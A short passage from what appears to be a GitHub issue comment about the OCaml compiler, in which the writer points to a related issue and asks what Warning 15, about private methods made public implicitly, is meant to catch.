ocaml/ocaml#3231 , it is explaned an intended behaviour, but they are surprising.\r\n\r\nI thought Warning 15: the following private methods were made public implicitly: ... should be for this but no warning is reported.  What is Warning 15 for?\n"}]